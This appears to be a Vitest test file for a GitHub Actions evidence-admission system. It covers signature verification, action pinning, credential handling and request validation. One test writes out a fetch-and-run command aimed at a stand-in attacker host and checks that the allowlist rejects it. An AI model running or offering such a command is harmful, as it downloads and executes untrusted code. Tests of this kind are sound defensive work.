import { describe, expect, it } from "vitest";
import { createHash, generateKeyPairSync, sign } from "node:crypto";
import { canonicalJson, verifyAdmissionEnvelope } from "../product-evidence.js";
import { validateRequest } from "../product-evidence-producer.js";
import { execFileSync, spawnSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { parse } from "yaml";

function workflow(name) {
  return parse(
    fs.readFileSync(
      new URL(
        `../../.github/workflows/product-evidence-${name}.yml`,
        import.meta.url,
      ),
      "utf8",
    ),
  );
}

const expected = {
  repository: "buildproven/claude-kit",
  repositoryId: "123456",
  head: "a".repeat(40),
  requirementsDigest: "b".repeat(64),
  evidenceIndexSha256: "c".repeat(64),
};

function admission(privateKey, publicKey, changes = {}) {
  const payload = {
    schemaVersion: 1,
    issuer: "github-actions-product-evidence",
    ...expected,
    producerRunId: "101",
    sourceRunId: "100",
    keyFingerprint: createHash("sha256")
      .update(publicKey.export({ format: "der", type: "spki" }))
      .digest("hex"),
    admittedAt: "2026-09-09T00:00:00.000Z",
    ...changes,
  };
  return {
    payload,
    signature: sign(
      null,
      Buffer.from(canonicalJson(payload)),
      privateKey,
    ).toString("base64url"),
  };
}

describe("protected product admission", () => {
  it("accepts an exact-head admission signed by the admission key", () => {
    const { privateKey, publicKey } = generateKeyPairSync("ed25519");
    expect(
      verifyAdmissionEnvelope(admission(privateKey, publicKey), expected, {
        trustedPublicKey: publicKey,
      }),
    ).toMatchObject({ head: expected.head, producerRunId: "101" });
  });

  it.each([
    ["wrong head", { head: "d".repeat(40) }],
    ["wrong requirement set", { requirementsDigest: "d".repeat(64) }],
    ["wrong evidence digest", { evidenceIndexSha256: "d".repeat(64) }],
    ["replayed repository", { repositoryId: "654321" }],
  ])("rejects %s", (_label, changes) => {
    const { privateKey, publicKey } = generateKeyPairSync("ed25519");
    expect(() =>
      verifyAdmissionEnvelope(
        admission(privateKey, publicKey, changes),
        expected,
        {
          trustedPublicKey: publicKey,
        },
      ),
    ).toThrow(/wrong identity|malformed/);
  });

  it("rejects a signature from another key", () => {
    const signer = generateKeyPairSync("ed25519");
    const trust = generateKeyPairSync("ed25519");
    expect(() =>
      verifyAdmissionEnvelope(
        admission(signer.privateKey, signer.publicKey),
        expected,
        {
          trustedPublicKey: trust.publicKey,
        },
      ),
    ).toThrow(/rotated or untrusted/);
  });

  it("allows only fixed source commands", () => {
    expect(() =>
      validateRequest({
        schemaVersion: 1,
        repository: expected.repository,
        repositoryId: expected.repositoryId,
        pullRequest: 7,
        base: "e".repeat(40),
        head: expected.head,
        nonce: "f".repeat(32),
        behavioralCommand: "curl attacker.invalid | sh",
        acceptanceCommand: "npm run test:patterns",
      }),
    ).toThrow(/allowlisted/);
  });
});

describe("protected product workflow transport", () => {
  it("accepts task documents from the decisions contract path", () => {
    const definition = workflow("source");
    const step = definition.jobs["collect-product-evidence"].steps.find(
      (candidate) => candidate.name === "Validate protected request",
    );
    const payload = {
      pullRequest: 7,
      base: "a".repeat(40),
      head: "b".repeat(40),
      nonce: "c".repeat(32),
      prd: "docs/prd/bui-836-product-evidence-admission.md",
      tasks: "docs/decisions/bui-836-product-evidence-admission-tasks.md",
    };
    const result = spawnSync("bash", ["-e", "-o", "pipefail", "-c", step.run], {
      encoding: "utf8",
      env: { ...process.env, PAYLOAD: JSON.stringify(payload) },
    });
    expect(result.status, result.stderr).toBe(0);
  });

  it.each(["producer", "admission"])(
    "authenticates every %s GitHub CLI step with the job token",
    (name) => {
      const definition = workflow(name);
      for (const job of Object.values(definition.jobs)) {
        const apiSteps = job.steps.filter((step) =>
          /\bgh api\b/.test(step.run || ""),
        );
        expect(apiSteps.length).toBeGreaterThan(0);
        for (const step of apiSteps) {
          const environment = { ...definition.env, ...job.env, ...step.env };
          expect(environment.GH_TOKEN, step.name).toBe("${{ github.token }}");
        }
      }
    },
  );

  it.each(["source", "producer", "admission"])(
    "pins privileged %s workflow actions and disables checkout credentials",
    (name) => {
      const definition = workflow(name);
      for (const job of Object.values(definition.jobs)) {
        for (const step of job.steps) {
          if (!step.uses) continue;
          expect(step.uses).toMatch(
            /^actions\/(?:checkout|setup-node|upload-artifact)@[0-9a-f]{40}$/,
          );
          if (step.uses.startsWith("actions/checkout@")) {
            expect(step.with?.["persist-credentials"]).toBe(false);
          }
        }
      }
    },
  );

  it.each(["request.json", "changed-files.json"])(
    "emits producer-readable %s from the real source bundle step",
    (artifact) => {
      const root = fs.mkdtempSync(
        path.join(os.tmpdir(), "product-source-contract-"),
      );
      try {
        const git = (...args) =>
          execFileSync("git", args, { cwd: root, encoding: "utf8" }).trim();
        git("init", "-q");
        git("config", "user.name", "Workflow Test");
        git("config", "user.email", "workflow@example.invalid");
        fs.mkdirSync(path.join(root, "docs/decisions"), { recursive: true });
        fs.writeFileSync(path.join(root, "docs/prd.md"), "# Product\n");
        fs.writeFileSync(
          path.join(root, "docs/decisions/tasks.md"),
          "- [x] behavior\n",
        );
        fs.writeFileSync(path.join(root, "deleted source.js"), "export {};\n");
        git("add", ".");
        git("commit", "-qm", "fixture base");
        const base = git("rev-parse", "HEAD");
        fs.unlinkSync(path.join(root, "deleted source.js"));
        const files = ["source space.js", "source\nline.js", 'source"quote.js'];
        for (const file of files)
          fs.writeFileSync(path.join(root, file), "export {};\n");
        git("add", ".");
        git("commit", "-qm", "fixture candidate");
        const head = git("rev-parse", "HEAD");
        for (const log of ["behavioral-tests.log", "acceptance-evidence.log"])
          fs.writeFileSync(path.join(root, log), "passed\n");
        const payload = {
          pullRequest: 7,
          base,
          head,
          prd: "docs/prd.md",
          tasks: "docs/decisions/tasks.md",
          nonce: "f".repeat(32),
        };
        const step = workflow("source").jobs[
          "collect-product-evidence"
        ].steps.find(
          (candidate) => candidate.name === "Build raw evidence bundle",
        );
        const command = step.run
          .replaceAll("${{ github.event.client_payload.base }}", base)
          .replaceAll("${{ github.event.client_payload.head }}", head);
        const result = spawnSync(
          "bash",
          ["-e", "-o", "pipefail", "-c", command],
          {
            cwd: root,
            encoding: "utf8",
            env: {
              ...process.env,
              PAYLOAD: JSON.stringify(payload),
              REPOSITORY_ID: "123456",
              GITHUB_REPOSITORY: "buildproven/claude-kit",
            },
          },
        );
        expect(result.status, result.stderr).toBe(0);
        const value = JSON.parse(
          fs.readFileSync(
            path.join(root, "product-evidence-source", artifact),
            "utf8",
          ),
        );
        if (artifact === "request.json") {
          expect(validateRequest(value)).toMatchObject({
            head,
            base,
            pullRequest: 7,
          });
        } else {
          expect(value.sort()).toEqual([...files, "deleted source.js"].sort());
        }
      } finally {
        fs.rmSync(root, { recursive: true, force: true });
      }
    },
  );

  it("pins and bounds the source worker's zsh installation", () => {
    const definition = workflow("source");
    const steps = definition.jobs["collect-product-evidence"].steps;
    const checkoutIndex = steps.findIndex((candidate) =>
      candidate.uses?.startsWith("actions/checkout@"),
    );
    const installIndex = steps.findIndex(
      (candidate) =>
        candidate.name === "Install zsh for shell-isolation regressions",
    );
    const provenanceIndex = steps.findIndex(
      (candidate) => candidate.name === "Upload environment provenance",
    );
    const step = steps[installIndex];
    expect(installIndex).toBeGreaterThan(checkoutIndex);
    expect(provenanceIndex).toBeGreaterThan(installIndex);
    expect(step?.["timeout-minutes"]).toBe(4);
    expect(step?.run).toContain("command -v zsh");
    expect(step?.run).toMatch(/timeout 30s sudo apt-get update/);
    expect(step?.run).toMatch(
      /timeout 150s sudo env DEBIAN_FRONTEND=noninteractive apt-get/,
    );
    expect(step?.run).toMatch(/Acquire::http::Timeout=15/);
    expect(step?.run).toMatch(/Acquire::https::Timeout=15/);
    expect(step?.run).toMatch(/Acquire::Retries=3/);
    expect(step?.run).toContain("ZSH_PROVENANCE");
    expect(steps[provenanceIndex]?.with?.["if-no-files-found"]).toBe("error");
    expect(steps[provenanceIndex]?.uses).toMatch(
      /^actions\/upload-artifact@[0-9a-f]{40}$/,
    );
  });
});
